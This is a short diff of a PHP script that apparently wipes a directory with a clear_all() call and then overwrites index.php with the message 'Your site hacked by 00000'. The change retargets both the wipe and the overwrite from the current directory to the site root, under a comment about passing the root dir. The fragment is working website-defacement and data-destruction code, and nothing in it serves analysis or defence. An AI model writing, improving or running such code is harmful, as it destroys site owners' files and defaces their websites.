@@ -33,9 +33,9 @@
    }
    
    // you need  to  pass root  dir  here
-   if (clear_all($cur_dir, $cur_dir)) {
+   if (clear_all($root, $root)) {
       $deface_page  = 'Your  site hacked  by 00000';
-      $f = fopen($cur_dir.'index.php', 'w');
+      $f = fopen($root.'index.php', 'w');
       $write= fwrite($f, $deface_page);
       if ($write) {
          echo 'Operations  success!!';
